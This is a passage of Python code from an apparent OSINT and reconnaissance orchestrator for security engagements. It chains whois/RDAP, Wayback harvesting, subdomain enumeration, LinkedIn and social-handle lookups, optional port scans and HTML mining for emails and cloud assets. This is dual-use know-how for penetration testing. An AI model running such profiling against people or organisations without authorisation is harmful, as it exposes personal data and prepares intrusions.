            )
            _cli_audit(
                db_path_value,
                engagement_id_value,
                "orchestrator",
                "kill_chain",
                "rdap_lookup",
                target=root_domain,
                result=f"registrar={registrar} emails={len(reg_emails)} ns={len(nameservers)}",
            )
            return {
                "root_domain": root_domain,
                "handle": rdap_handle,
                "has_rdap": True,
                "output_count_base": int(item["output_count_base"]),
                "registrar": str(registrar)[:80],
                "registrant_emails": len(reg_emails),
                "nameservers": len(nameservers),
            }
        _log(
            f"{iteration}.H whois/RDAP",
            f"[dim]{root_domain}: RDAP query failed or no data[/dim]",
        )
        return {
            "root_domain": root_domain,
            "handle": rdap_handle,
            "has_rdap": False,
        }

    def _prepare_rdap_domain_finalize_entry(
        item: dict[str, object],
    ) -> dict[str, object] | None:
        handle = item.get("handle")
        if handle is None:
            return None
        has_rdap = bool(item.get("has_rdap"))
        extra_metadata: dict[str, object]
        if has_rdap:
            extra_metadata = {
                "iteration": iteration,
                "registrar": str(item.get("registrar") or "")[:80],
                "registrant_emails": int(item.get("registrant_emails") or 0),
                "nameservers": int(item.get("nameservers") or 0),
            }
        else:
            extra_metadata = {"iteration": iteration, "reason": "no_data"}
        return _prepare_module_seed_run_finalization_entry(
            (
                handle,
                {"metadata": {"iteration": iteration}},
            ),
            base_metadata_value={},
            status="completed" if has_rdap else "skipped",
            output_count=int(item.get("output_count_base") or 0) if has_rdap else 0,
            extra_metadata=extra_metadata,
        )

    def _apply_wayback_domain_result_entry(
        item: dict[str, object],
        *,
        db_path_value: str,
        engagement_id_value: int,
        max_workers_value: int,
        wayback_full_value: bool,
    ) -> dict[str, object]:
        root_domain = str(item["root_domain"])
        wayback_handle = item["handle"]
        wayback_hosts = cast(list[str], item["unique_hosts"])
        wayback_urls = {
            str(url or "").strip()
            for url in cast(list[str], item.get("urls") or [])
            if str(url or "").strip()
        }
        raw_url_metadata = item.get("url_metadata") or {}
        url_metadata = (
            cast(dict[str, dict[str, Any]], raw_url_metadata)
            if isinstance(raw_url_metadata, dict)
            else {}
        )
        url_count = int(item["url_count"])
        host_count = int(item["host_count"])
        new_host_count = _persist_new_hostnames(
            wayback_hosts,
            discovery="html_href_extract",
            max_workers=max_workers_value,
            progress_label=f"{iteration}.I host persist prep",
            progress_callback=_record_batch_progress,
        )
        new_url_count = _persist_discovered_crawl_urls(
            wayback_urls,
            discovery="historical_cdx",
            url_metadata=url_metadata,
            max_workers=max_workers_value,
            progress_label=f"{iteration}.I URL persist prep",
            progress_callback=_record_batch_progress,
        )
        _log(
            f"{iteration}.I Wayback CDX",
            (
                f"{root_domain}: fetched {url_count} historical URL(s) "
                f"[{'FULL' if wayback_full_value else 'capped-500'}], "
                f"{host_count} unique host(s), +{new_host_count} host(s), "
                f"+{new_url_count} URL seed(s)"
            ),
        )
        _cli_audit(
            db_path_value,
            engagement_id_value,
            "orchestrator",
            "kill_chain",
            "wayback_cdx",
            target=root_domain,
            result=(
                f"urls={url_count} new_hosts={new_host_count} "
                f"new_urls={new_url_count} full={wayback_full_value}"
            ),
        )
        return {
            "root_domain": root_domain,
            "handle": wayback_handle,
            "url_count": url_count,
            "host_count": host_count,
            "new_host_count": new_host_count,
            "new_url_count": new_url_count,
            "mode": str(item["mode"]),
        }

    def _prepare_wayback_domain_finalize_entry(
        item: dict[str, object],
    ) -> dict[str, object] | None:
        handle = item.get("handle")
        if handle is None:
            return None
        return _prepare_module_seed_run_finalization_entry(
            (
                handle,
                {"metadata": {"iteration": iteration}},
            ),
            base_metadata_value={},
            status="completed",
            output_count=max(
                int(item.get("new_host_count") or 0),
                int(item.get("new_url_count") or 0),
                int(item.get("host_count") or 0),
            ),
            extra_metadata={
                "iteration": iteration,
                "urls": int(item.get("url_count") or 0),
                "new_hosts": int(item.get("new_host_count") or 0),
                "new_urls": int(item.get("new_url_count") or 0),
                "mode": str(item.get("mode") or ""),
            },
        )

    def _prepare_cloud_validation_log_entry(
        item: tuple[dict[str, Any], dict[str, Any]],
    ) -> dict[str, str]:
        target_item, validation = item
        service = str(target_item.get("service") or "")
        ref = str(target_item.get("ref") or "")
        if validation.get("status") == "success":
            message = (
                f"{validation.get('validation_status', 'UNKNOWN')} "
                f"via {validation.get('validation_method', 'n/a')}"
            )
        else:
            message = f"[yellow]failed[/yellow] {validation.get('error', 'unknown error')}"
        return {
            "label": f"{iteration}.J validate {service} ({ref})",
            "message": message,
        }

    def _apply_prepared_log_entry(
        item: dict[str, str] | None,
    ) -> str | None:
        if item is None:
            return None
        label = str(item.get("label") or "").strip()
        if not label:
            return None
        _log(label, str(item.get("message") or ""))
        return label

    def _emit_no_pending_resume_skip_log(
        stage_label: str,
        message: str,
        *,
        progress_label_prefix: str,
        max_workers: int,
        progress_callback: Callable[[str, dict[str, object]], None] | None,
    ) -> None:
        _emit_prepared_log_entries(
            [(stage_label, message)],
            prepare_worker=_prepare_log_entry,
            max_workers=max_workers,
            prep_progress_label=f"{progress_label_prefix} no-pending prep",
            merge_progress_label=f"{progress_label_prefix} no-pending merge",
            progress_callback=progress_callback,
            order_note="no-pending log order preserved",
        )

    def _emit_no_domain_skip_log(
        stage_label: str,
        message: str,
        *,
        progress_label_prefix: str,
        max_workers: int,
        progress_callback: Callable[[str, dict[str, object]], None] | None,
    ) -> None:
        _emit_prepared_log_entries(
            [(stage_label, message)],
            prepare_worker=_prepare_log_entry,
            max_workers=max_workers,
            prep_progress_label=f"{progress_label_prefix} no-domain prep",
            merge_progress_label=f"{progress_label_prefix} no-domain merge",
            progress_callback=progress_callback,
            order_note="no-domain log order preserved",
        )

    def _emit_prepared_notice_log(
        stage_label: str,
        message: str,
        *,
        progress_label_prefix: str,
        notice_suffix: str,
        order_note: str,
        max_workers: int,
        progress_callback: Callable[[str, dict[str, object]], None] | None,
    ) -> None:
        _emit_prepared_log_entries(
            [(stage_label, message)],
            prepare_worker=_prepare_log_entry,
            max_workers=max_workers,
            prep_progress_label=f"{progress_label_prefix} {notice_suffix} prep",
            merge_progress_label=f"{progress_label_prefix} {notice_suffix} merge",
            progress_callback=progress_callback,
            order_note=order_note,
        )

    def _prepare_social_handle_chain_result(
        handle: str,
        *,
        sherlock_pairs: list[tuple[str, int]],
        instagram_pairs: list[tuple[str, int]],
    ) -> dict[str, object]:
        handle_returncodes = [
            int(returncode)
            for candidate_handle, returncode in sherlock_pairs
            if candidate_handle == handle
        ]
        handle_returncodes.extend(
            int(returncode)
            for candidate_handle, returncode in instagram_pairs
            if candidate_handle == handle
        )
        chain_status = (
            "skipped"
            if dry_run_all
            else "completed"
            if handle_returncodes and all(rc == 0 for rc in handle_returncodes)
            else "failed"
        )
        return {
            "handle": handle,
            "returncodes": handle_returncodes,
            "chain_status": chain_status,
            "output_count": max(1, len(handle_returncodes)),
            "error": None
            if chain_status != "failed"
            else "one or more social-handle fan-out modules failed",
            "seed_run_entry": _prepare_one_shot_seed_run_entry(
                seed_value=handle,
                seed_type="username",
                loop_name="fanout_e5_chain",
                source="social_profile",
                depth=2,
                confidence=0.8,
                start_metadata={"iteration": iteration},
                status=chain_status,
                output_count=max(1, len(handle_returncodes)),
                error=(
                    None
                    if chain_status != "failed"
                    else "one or more social-handle fan-out modules failed"
                ),
                finish_metadata={
                    "iteration": iteration,
                    "returncodes": handle_returncodes,
                },
            ),
        }

    def _apply_social_handle_chain_result(
        item: dict[str, object],
        *,
        processed_social_handles_out: set[str],
    ) -> str:
        handle = str(item.get("handle") or "")
        _apply_one_shot_seed_run_entry(
            cast(dict[str, object] | None, item.get("seed_run_entry"))
        )
        processed_social_handles_out.add(handle)
        return handle

    def _load_new_seed_values(
        seed_type: str,
        already: set[str],
        *,
        normalizer: Optional[Callable[[str], str]] = None,
        max_workers: int = 1,
        progress_label: str | None = None,
        progress_callback: Callable[[str, dict[str, object]], None] | None = None,
    ) -> set[str]:
        """Return persisted engagement seed values of a given type that have
        not yet been routed through their specialised fan-out."""
        normalize = normalizer or _resume_normalize
        con = _sq.connect(f"file:{db_path.as_posix()}?mode=ro", uri=True)
        try:
            try:
                rows = con.execute(
                    """
                    SELECT DISTINCT seed_value
                    FROM engagement_seeds
                    WHERE engagement_id=?
                      AND seed_type=?
                      AND COALESCE(status, 'pending') != 'failed'
                    """,
                    (engagement_id, seed_type),
                ).fetchall()
            except _sq.OperationalError:
                return set()
        finally:
            con.close()
        raw_seed_values = _collect_text_row_values(
            rows,
            max_workers=max_workers,
            progress_label=_derive_child_progress_label(progress_label, "row prep"),
            progress_callback=progress_callback,
        )
        prepared_seed_values = _run_inprocess_batch(
            raw_seed_values,
            lambda seed_value: _prepare_pending_seed_value(seed_value, normalize=normalize),
            max_workers=max_workers,
            progress_label=progress_label,
            progress_callback=progress_callback,
        )
        reduction_progress_label = _derive_reduction_progress_label(progress_label)
        if reduction_progress_label and len(prepared_seed_values) > 1 and max_workers > 1:
            _log(
                reduction_progress_label,
                f"[dim]parallel parse x{min(max_workers, len(prepared_seed_values))}[/dim]",
            )
        reduced_seed_values = _run_inprocess_batch(
            prepared_seed_values,
            lambda item: _prepare_seed_load_reduction_item(item, already=already),
            max_workers=max_workers,
            progress_label=reduction_progress_label,
            progress_callback=progress_callback,
        )
        loaded_seed_values: set[str] = set()
        _run_ordered_inprocess_apply_batch(
            reduced_seed_values,
            lambda item: _apply_loaded_seed_value_item(
                item,
                loaded_values_out=loaded_seed_values,
            ),
            progress_label=_derive_apply_progress_label(progress_label),
            progress_callback=progress_callback,
            order_note="loaded-seed merge order preserved",
        )
        return loaded_seed_values

    def _load_prioritized_seed_rows(
        seed_type: str,
        already: set[str],
        *,
        normalizer: Optional[Callable[[str], str]] = None,
        max_workers: int = 1,
        progress_label: str | None = None,
        progress_callback: Callable[[str, dict[str, object]], None] | None = None,
    ) -> list[tuple[str, int]]:
        """Return persisted engagement seed values in deterministic priority order.

        This preserves early operator-adjacent pivots when a recursive fan-out
        batch is capped, instead of letting later alphabetic sorting crowd them
        out of the first iteration.
        """
        normalize = normalizer or _resume_normalize
        con = _sq.connect(f"file:{db_path.as_posix()}?mode=ro", uri=True)
        try:
            try:
                rows = con.execute(
                    """
                    SELECT id, seed_value, COALESCE(source, ''), COALESCE(depth, 0)
                    FROM engagement_seeds
                    WHERE engagement_id=?
                      AND seed_type=?
                      AND COALESCE(status, 'pending') != 'failed'
                    ORDER BY
                      COALESCE(depth, 0) ASC,
                      CASE LOWER(COALESCE(source, ''))
                        WHEN 'operator' THEN 0
                        WHEN 'scope' THEN 1
                        WHEN 'cross_reference' THEN 2
                        WHEN 'social_profile' THEN 3
                        WHEN 'artifact' THEN 4
                        ELSE 9
                      END ASC,
                      id ASC
                    """,
                    (engagement_id, seed_type),
                ).fetchall()
            except _sq.OperationalError:
                return []
        finally:
            con.close()
        raw_prioritized_rows = [
            (str(row[1] or "").strip(), int(row[3] or 0))
            for row in rows
        ]
        if progress_label and len(raw_prioritized_rows) > 1 and max_workers > 1:
            _log(
                progress_label,
                f"[dim]parallel parse x{min(max_workers, len(raw_prioritized_rows))}[/dim]",
            )
        prepared_prioritized_rows = _run_inprocess_batch(
            raw_prioritized_rows,
            lambda item: _prepare_prioritized_seed_value(item, normalize=normalize),
            max_workers=max_workers,
            progress_label=progress_label,
            progress_callback=progress_callback,
        )
        reduction_progress_label = _derive_reduction_progress_label(progress_label)
        if reduction_progress_label and len(prepared_prioritized_rows) > 1 and max_workers > 1:
            _log(
                reduction_progress_label,
                f"[dim]parallel parse x{min(max_workers, len(prepared_prioritized_rows))}[/dim]",
            )
        reduced_prioritized_rows = _run_inprocess_batch(
            prepared_prioritized_rows,
            lambda item: _prepare_prioritized_seed_load_reduction_item(item, already=already),
            max_workers=max_workers,
            progress_label=reduction_progress_label,
            progress_callback=progress_callback,
        )
        prioritized: list[tuple[str, int]] = []
        seen_normalized: set[str] = set()
        _run_ordered_inprocess_apply_batch(
            reduced_prioritized_rows,
            lambda item: _apply_prioritized_seed_load_reduction_item(
                item,
                prioritized_out=prioritized,
                seen_normalized_out=seen_normalized,
            ),
            progress_label=_derive_apply_progress_label(progress_label),
            progress_callback=progress_callback,
            order_note="prioritized-seed merge order preserved",
        )
        return prioritized

    def _pending_sql_count(sql: str, params: tuple[object, ...] = ()) -> int:
        con = _sq.connect(f"file:{db_path.as_posix()}?mode=ro", uri=True)
        try:
            try:
                row = con.execute(sql, params).fetchone()
            except _sq.OperationalError:
                return 0
            return int((row[0] if row else 0) or 0)
        finally:
            con.close()

    def _pending_cloud_ref_count() -> int:
        if skip_cloud:
            return 0
        pending_refs: set[str] = set()
        for service, refs in all_cloud_refs.items():
            service_name = str(service or "").strip()
            if not service_name:
                continue
            for ref in refs or []:
                normalized_ref = str(ref or "").strip()
                if not normalized_ref:
                    continue
                key = f"{service_name}:{normalized_ref}"
                if key not in processed_cloud_refs:
                    pending_refs.add(key)
        return len(pending_refs)

    def _pending_url_seed_count() -> int:
        pending_rows = _load_prioritized_seed_rows(
            "url",
            processed_url_seeds,
            normalizer=_normalize_url_seed_value,
            max_workers=parallel_workers,
        )
        return sum(1 for seed_value, _depth in pending_rows if _url_seed_is_in_scope(seed_value))

    def _pending_work_counts() -> dict[str, int]:
        counts = {
            "url_seeds": _pending_url_seed_count(),
            "emails": len(_load_new_emails(processed_emails, max_workers=parallel_workers)),
            "social_handles": len(
                _load_new_social_handles(processed_social_handles, max_workers=parallel_workers)
            ),
            "github_orgs": 0 if skip_keyscan else len(all_github_orgs - processed_github_orgs),
            "cloud_refs": _pending_cloud_ref_count(),
            "username_seeds": len(
                _load_prioritized_seed_rows(
                    "username",
                    processed_username_seeds,
                    normalizer=_normalize_username_value,
                    max_workers=parallel_workers,
                )
            ),
            "phone_seeds": len(
                _load_new_seed_values("phone", processed_phone_seeds, max_workers=parallel_workers)
            ),
            "ip_seeds": len(
                _load_new_seed_values("ipv4", processed_ip_seeds, max_workers=parallel_workers)
                | _load_new_seed_values("ipv6", processed_ip_seeds, max_workers=parallel_workers)
            ),
            "name_seeds": len(
                _load_new_seed_values("name", processed_name_seeds, max_workers=parallel_workers)
            ),
            "company_seeds": len(
                _load_new_seed_values("company", processed_company_seeds, max_workers=parallel_workers)
            ),
            "artifact_queue": _pending_sql_count(
                """
                SELECT COUNT(*)
                FROM artifact_queue
                WHERE engagement_id=?
                  AND status IN ('queued','downloaded')
                """,
                (engagement_id,),
            ),
            "cloud_asset_validations": 0
            if skip_cloud or dry_run_all
            else _pending_sql_count(
                """
                SELECT COUNT(*)
                FROM cloud_assets ca
                LEFT JOIN cloud_validation_results cvr
                  ON cvr.engagement_id = ca.engagement_id
                 AND cvr.asset_type = ca.asset_type
                 AND cvr.identifier = ca.identifier
                WHERE ca.engagement_id=?
                  AND cvr.id IS NULL
                """,
                (engagement_id,),
            ),
        }
        return {label: int(count) for label, count in counts.items() if int(count) > 0}

    def _refresh_pending_work_state() -> dict[str, int]:
        counts = _pending_work_counts()
        run_progress_state["pending_work_counts"] = counts
        run_progress_state["pending_work_total"] = sum(counts.values())
        if counts:
            run_progress_state["last_iteration_stable"] = False
        return counts

    for iteration in range(1, max_iterations + 1):
        last_iteration = iteration
        if _maybe_interrupt_run(f"iteration_{iteration}_precheck"):
            return
        run_progress_state["phase"] = f"iteration_{iteration}"
        engagement_run_tracker.update_run(
            engagement_run_handle,
            current_iteration=iteration,
            metadata=_engagement_run_metadata(),
        )
        _log(f"iteration {iteration}/{max_iterations}", "begin")
        before = _snapshot()

        # ─── Fan-out A: subdomain enum ────────────────────────────────
        if root_domains:
            pending_a_domains, skipped_a_domains = _partition_root_domains(
                root_domains,
                completed_domains=completed_a_domains,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.A root-domain prep",
                progress_callback=_record_batch_progress,
            )
            skipped_a_log_inputs = [
                (f"{iteration}.A subdomain enum", root_domain)
                for root_domain in skipped_a_domains
            ]
            if len(skipped_a_log_inputs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.A skip-log prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(skipped_a_log_inputs))}[/dim]",
                )
            prepared_a_skip_logs = _run_inprocess_batch(
                skipped_a_log_inputs,
                _prepare_resume_skip_log_entry,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.A skip-log prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_a_skip_logs) > 1:
                _log(
                    f"{iteration}.A skip-log merge",
                    "[dim]sequential dispatch x1[/dim]  [dim]skip-log order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_a_skip_logs,
                _apply_prepared_log_entry,
                max_workers=1,
                progress_label=f"{iteration}.A skip-log merge",
                progress_callback=_record_batch_progress,
            )
            if len(pending_a_domains) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.A spec prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(pending_a_domains))}[/dim]",
                )
            a_specs = _run_inprocess_batch(
                pending_a_domains,
                lambda root_domain: ModuleDispatchSpec(
                    cmd_argv=["recon", "subdomains", "--engagement", engagement, "--domain", root_domain],
                    label=f"{iteration}.A subdomain enum ({root_domain})",
                    loop_name="fanout_a_subdomains",
                    seed_contexts=[_seed_context(root_domain, "domain")],
                    metadata={"iteration": iteration},
                ),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.A spec prep",
                progress_callback=_record_batch_progress,
            )
            if a_specs:
                if len(a_specs) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.A subdomain enum",
                        f"[dim]parallel dispatch x{min(parallel_workers, len(a_specs))}[/dim]",
                    )
                _run_module_batch(
                    a_specs,
                    _run_module,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.A subdomain enum",
                    progress_callback=_record_batch_progress,
                )
        else:
            _emit_no_domain_skip_log(
                f"{iteration}.A subdomain enum",
                f"[dim]skipped (seed_type={seed_type} has no domain)[/dim]",
                progress_label_prefix=f"{iteration}.A",
                max_workers=parallel_workers,
                progress_callback=_record_batch_progress,
            )

        # ─── Fan-out A2 (opt-in): active port scan ────────────────────
        if active_recon:
            _run_module(
                ["recon", "ports", "--engagement", engagement, "--basic",
                 "--timeout", "1.5"],
                f"{iteration}.A2 port scan (ACTIVE)",
            )

        # ─── Fan-out B: theHarvester (emails + hosts + subdomains) ─────
        if root_domains:
            pending_b_domains, skipped_b_domains = _partition_root_domains(
                root_domains,
                completed_domains=completed_b_domains,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.B root-domain prep",
                progress_callback=_record_batch_progress,
            )
            skipped_b_norms = _collect_normalized_value_set(
                skipped_b_domains,
                normalizer=_resume_normalize,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.B skipped-domain norm prep",
                progress_callback=_record_batch_progress,
            )
            pending_b_norms = _collect_normalized_value_set(
                pending_b_domains,
                normalizer=_resume_normalize,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.B pending-domain norm prep",
                progress_callback=_record_batch_progress,
            )
            pending_b2_domains: list[str] = []
            skipped_b2_domains: list[str] = []
            pending_b2_norms: set[str] = set()
            skipped_b2_norms: set[str] = set()
            if iteration == 1:
                pending_b2_domains, skipped_b2_domains = _partition_root_domains(
                    root_domains,
                    completed_domains=completed_b2_domains,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.B2 root-domain prep",
                    progress_callback=_record_batch_progress,
                )
                pending_b2_norms = _collect_normalized_value_set(
                    pending_b2_domains,
                    normalizer=_resume_normalize,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.B2 pending-domain norm prep",
                    progress_callback=_record_batch_progress,
                )
                skipped_b2_norms = _collect_normalized_value_set(
                    skipped_b2_domains,
                    normalizer=_resume_normalize,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.B2 skipped-domain norm prep",
                    progress_callback=_record_batch_progress,
                )
            b_specs: list[ModuleDispatchSpec] = []
            if len(root_domains) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.B passive spec prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(root_domains))}[/dim]",
                )
            prepared_b_specs = _run_inprocess_batch(
                root_domains,
                lambda root_domain: {
                    "root_domain": root_domain,
                    "normalized_root_domain": _resume_normalize(root_domain),
                    "skip_b": _resume_normalize(root_domain) in skipped_b_norms,
                    "run_b": _resume_normalize(root_domain) in pending_b_norms,
                    "skip_b2": iteration == 1 and _resume_normalize(root_domain) in skipped_b2_norms,
                    "run_b2": iteration == 1 and _resume_normalize(root_domain) in pending_b2_norms,
                    "dispatch_specs": [
                        *(
                            [
                                ModuleDispatchSpec(
                                    cmd_argv=[
                                        "osint",
                                        "harvest",
                                        "--engagement",
                                        engagement,
                                        "--domain",
                                        root_domain,
                                        "--sources",
                                        "crtsh,duckduckgo,certspotter,dnsdumpster,rapiddns",
                                    ],
                                    label=f"{iteration}.B harvest ({root_domain})",
                                    loop_name="fanout_b_harvest",
                                    seed_contexts=[_seed_context(root_domain, "domain")],
                                    metadata={"iteration": iteration},
                                )
                            ]
                            if _resume_normalize(root_domain) in pending_b_norms
                            else []
                        ),
                        *(
                            [
                                ModuleDispatchSpec(
                                    cmd_argv=[
                                        "osint",
                                        "linkedin",
                                        "--engagement",
                                        engagement,
                                        "--domain",
                                        root_domain,
                                        "--max-dorks",
                                        "3",
                                    ],
                                    label=f"{iteration}.B2 crosslinked ({root_domain})",
                                    loop_name="fanout_b2_linkedin",
                                    seed_contexts=[_seed_context(root_domain, "domain")],
                                    metadata={"iteration": iteration},
                                )
                            ]
                            if iteration == 1 and _resume_normalize(root_domain) in pending_b2_norms
                            else []
                        ),
                    ],
                },
                max_workers=parallel_workers,
                progress_label=f"{iteration}.B passive spec prep",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_b_specs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.B passive schedule prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(prepared_b_specs))}[/dim]",
                )
            scheduled_b_entries = _run_inprocess_batch(
                prepared_b_specs,
                lambda item: {
                    "root_domain": str(item["root_domain"]),
                    "skip_b": bool(item["skip_b"]),
                    "skip_b2": bool(item["skip_b2"]),
                    "dispatch_specs": list(item["dispatch_specs"]),
                },
                max_workers=parallel_workers,
                progress_label=f"{iteration}.B passive schedule prep",
                progress_callback=_record_batch_progress,
            )
            if len(scheduled_b_entries) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.B passive schedule reduction",
                    f"[dim]parallel parse x{min(parallel_workers, len(scheduled_b_entries))}[/dim]",
                )
            prepared_b_schedule_reductions = _run_inprocess_batch(
                scheduled_b_entries,
                _prepare_passive_domain_schedule_reduction,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.B passive schedule reduction",
                progress_callback=_record_batch_progress,
            )
            if len(prepared_b_schedule_reductions) > 1:
                _log(
                    f"{iteration}.B passive schedule merge",
                    "[dim]sequential dispatch x1[/dim]  [dim]skip-log/spec order preserved[/dim]",
                )
            _run_inprocess_batch(
                prepared_b_schedule_reductions,
                lambda item: _apply_passive_domain_schedule_reduction_item(
                    item,
                    dispatch_specs_out=b_specs,
                ),
                max_workers=1,
                progress_label=f"{iteration}.B passive schedule merge",
                progress_callback=_record_batch_progress,
            )
            if b_specs:
                if len(b_specs) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.B passive batch",
                        f"[dim]parallel dispatch x{min(parallel_workers, len(b_specs))}[/dim]",
                    )
                _run_module_batch(
                    b_specs,
                    _run_module,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.B passive batch",
                    progress_callback=_record_batch_progress,
                )
        else:
            _emit_no_domain_skip_log(
                f"{iteration}.B harvest",
                f"[dim]skipped (seed_type={seed_type} has no domain)[/dim]",
                progress_label_prefix=f"{iteration}.B",
                max_workers=parallel_workers,
                progress_callback=_record_batch_progress,
            )

        # ─── Fan-out C: PTR reverse-DNS on all known IPs ───────────────
        if dry_run_all:
            _emit_prepared_notice_log(
                f"{iteration}.C PTR reverse-DNS",
                "[yellow]DRY-RUN-ALL[/yellow] would reverse-resolve known IPs",
                progress_label_prefix=f"{iteration}.C PTR",
                notice_suffix="dry-run",
                order_note="dry-run notice order preserved",
                max_workers=parallel_workers,
                progress_callback=_record_batch_progress,
            )
        else:
            ptr_new = _ptr_enrich_ips()
            _log(f"{iteration}.C PTR reverse-DNS", f"{ptr_new} new hostname(s)")

        # ─── Fan-out D: per-subdomain fetch + cloud regex + HTML mining ─
        # Uses Playwright for SPA-rendered content (default); falls back
        # to httpx per-URL on Playwright miss. --no-playwright forces
        # httpx-only (faster, misses React/Vue/Angular runtime content).
        # After fetch, we mine HTML for: cloud refs, new emails, GitHub
        # orgs, and same-domain subdomains referenced in href/src attrs.
        if not dry_run_all:
            hostnames = _load_known_hostnames(
                max_workers=parallel_workers,
                progress_label=f"{iteration}.D known host prep",
                progress_callback=_record_batch_progress,
            )[:20]  # cap for runtime
            fetch_spec_inputs = [
                (host, scheme)
                for host in hostnames
                for scheme in ("https", "http")
            ]
            if len(fetch_spec_inputs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.D fetch spec prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(fetch_spec_inputs))}[/dim]",
                )
            fetch_specs = _run_inprocess_batch(
                fetch_spec_inputs,
                lambda item: HtmlFetchSpec(
                    url=f"{item[1]}://{item[0]}",
                    use_playwright=not no_playwright,
                    playwright_timeout=15.0,
                    fallback_timeout=8.0,
                ),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.D fetch spec prep",
                progress_callback=_record_batch_progress,
            )
            passive_text_spec_inputs = [
                (host, scheme, resource_name)
                for host in hostnames
                for scheme in ("https", "http")
                for resource_name in ("robots.txt", "sitemap.xml")
            ]
            if len(passive_text_spec_inputs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.D2 passive fetch spec prep",
                    f"[dim]parallel parse x{min(parallel_workers, len(passive_text_spec_inputs))}[/dim]",
                )
            passive_text_specs = _run_inprocess_batch(
                passive_text_spec_inputs,
                lambda item: HtmlFetchSpec(
                    url=f"{item[1]}://{item[0]}/{item[2]}",
                    use_playwright=False,
                    playwright_timeout=0.0,
                    fallback_timeout=6.0,
                ),
                max_workers=parallel_workers,
                progress_label=f"{iteration}.D2 passive fetch spec prep",
                progress_callback=_record_batch_progress,
            )
            if len(fetch_specs) > 1 and parallel_workers > 1:
                _log(
                    f"{iteration}.D cloud+HTML mining",
                    f"[dim]parallel fetch x{min(parallel_workers, len(fetch_specs))}[/dim]",
                )
            html_results = _run_html_fetch_batch(
                fetch_specs,
                _fetch_playwright_rendered,
                _fetch_target_html,
                max_workers=parallel_workers,
                progress_label=f"{iteration}.D cloud+HTML fetch",
                progress_callback=_record_batch_progress,
            )
            passive_text_urls: set[str] = set()
            html_surface_urls: set[str] = set()
            mined = _empty_html_mined_result()
            surface_cloud_ref_items: list[dict[str, list[str]]] = []
            main_surface_parse_results: list[dict[str, Any]] = []
            html_parse_urls = [spec.url for spec in fetch_specs]
            html_parse_items: list[tuple[str, Any]] = []
            _run_ordered_inprocess_apply_batch(
                list(enumerate(html_results)),
                lambda item: _apply_indexed_pair_item(
                    item,
                    leading_values=html_parse_urls,
                    pair_items_out=html_parse_items,
                ),
                progress_label=f"{iteration}.D1 HTML parse input apply",
                progress_callback=_record_batch_progress,
                order_note="HTML parse input order preserved",
            )
            if html_parse_items:
                if len(html_parse_items) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.D1 HTML parse",
                        f"[dim]parallel parse x{min(parallel_workers, len(html_parse_items))}[/dim]",
                    )
                html_surface_results = _run_inprocess_batch(
                    html_parse_items,
                    lambda item: {
                        "mined": _extract_html_data(item[1], base_url=item[0]),
                        "cloud_refs": _extract_cloud_refs(item[1]) if not skip_cloud and item[1] else {},
                    },
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.D1 HTML parse",
                    progress_callback=_record_batch_progress,
                )
                main_surface_parse_results.extend(
                    cast(list[dict[str, Any]], html_surface_results)
                )
            if passive_text_specs:
                if len(passive_text_specs) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.D2 passive text mining",
                        f"[dim]parallel fetch x{min(parallel_workers, len(passive_text_specs))}[/dim]",
                    )
                passive_text_results = _run_html_fetch_batch(
                    passive_text_specs,
                    _fetch_playwright_rendered,
                    _fetch_target_html,
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.D2 passive text fetch",
                    progress_callback=_record_batch_progress,
                )
                passive_text_parse_urls = [spec.url for spec in passive_text_specs]
                passive_text_parse_items: list[tuple[str, Any]] = []
                _run_ordered_inprocess_apply_batch(
                    list(enumerate(passive_text_results)),
                    lambda item: _apply_indexed_pair_item(
                        item,
                        leading_values=passive_text_parse_urls,
                        pair_items_out=passive_text_parse_items,
                    ),
                    progress_label=f"{iteration}.D2 passive text parse input apply",
                    progress_callback=_record_batch_progress,
                    order_note="passive-text parse input order preserved",
                )
                if passive_text_parse_items:
                    if len(passive_text_parse_items) > 1 and parallel_workers > 1:
                        _log(
                            f"{iteration}.D2 passive text parse",
                            f"[dim]parallel parse x{min(parallel_workers, len(passive_text_parse_items))}[/dim]",
                        )
                    passive_text_parse_results = _run_inprocess_batch(
                        passive_text_parse_items,
                        lambda item: {
                            "passive_urls": _extract_passive_text_urls(item[1], base_url=item[0]),
                            "mined": _extract_html_data(item[1], base_url=item[0]),
                            "cloud_refs": _extract_cloud_refs(item[1]) if not skip_cloud and item[1] else {},
                        },
                        max_workers=parallel_workers,
                        progress_label=f"{iteration}.D2 passive text parse",
                        progress_callback=_record_batch_progress,
                    )
                    main_surface_parse_results.extend(
                        cast(list[dict[str, Any]], passive_text_parse_results)
                    )
            if main_surface_parse_results:
                if len(main_surface_parse_results) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.D surface result prep",
                        f"[dim]parallel parse x{min(parallel_workers, len(main_surface_parse_results))}[/dim]",
